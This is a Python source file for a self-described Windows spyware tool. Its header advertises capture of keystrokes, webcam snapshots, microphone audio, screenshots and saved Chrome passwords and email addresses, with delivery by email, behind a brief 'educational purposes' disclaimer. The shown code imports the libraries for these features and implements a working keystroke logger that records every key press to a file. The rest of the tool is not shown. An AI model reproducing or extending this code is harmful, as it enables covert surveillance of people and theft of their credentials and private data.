# Author: Aneesh Arunjunai
# Version: 1.0
# This software is used to exfiltrate recorded data from microphone, screenshots, keystrokes, webcam and cached sensitive information such as passwords, email addresses, etc. from Google Chrome. 

# Meant to be used only for educational purposes and any illegal usage of this software is strictly not advised. 


#------------------------------------- v1.0 Features: Keystrokes Capture, Web Cam Snapshot, Mic Recording, Browser Data (Passwords, Emails), Screenshot Capture, Send Email -------------------------------------#

Module_Names = ["subprocess", "socket", "win32clipboard", "os", "re", "smtplib", "logging", "pathlib", "json", "time", "cv2", "sounddevice", "shutil", "requests", "browserhistory"]
for _Library in Module_Names:   
    globals()[_Library] = __import__(_Library)

#------------------------------------- The Loop above is used to import multiple modules using the in-built __import__() function globally -------------------------------------#

from email.mime.multipart import MIMEMultipart      
from email.mime.text import MIMEText                
from email.mime.base import MIMEBase                
from email import encoders
from pynput.keyboard import Key, Listener           
from PIL import ImageGrab                           
from scipy.io.wavfile import write as write_rec     
from cryptography.fernet import Fernet 
from multiprocessing import Process                 
            

# Keystrokes Capture

def keystroke_logger(file_path):
    logging.basicConfig(filename = (file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    on_press = lambda Key : logging.info(str(Key))  # Log the Pressed Keys
    with Listener(on_press=on_press) as listener:   # Collect events until released
        listener.join()

